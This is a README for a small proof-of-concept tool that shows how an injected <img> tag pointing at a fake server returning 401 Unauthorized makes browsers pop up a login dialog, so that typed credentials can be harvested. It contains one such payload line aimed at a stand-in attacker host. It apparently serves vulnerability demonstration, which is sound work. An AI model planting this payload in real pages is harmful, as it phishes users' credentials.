# img401

A very simple slapped together script designed for proof-of-concept demonstration for certain XSS or HTML injection vulnerabilities. It hosts a fake webserver that responds to any request with a 401 Unauthorized HTTP response. If the end user enters a username or password when prompted, it prints it to the screen.

The purpose of this script is to show how injecting an <img> tag into a webpage can be used to mount a client-side attack.

  &lt;img src="http://evil.org:8888/favicon.ico"&gt;&lt;/img&gt;
  
 When this image is loaded by a browser, the 401 response will automatically trigger a dialogue box for the user. This could result in a user being manipulated into entering their credentials, allowing the attacker to harvest them.
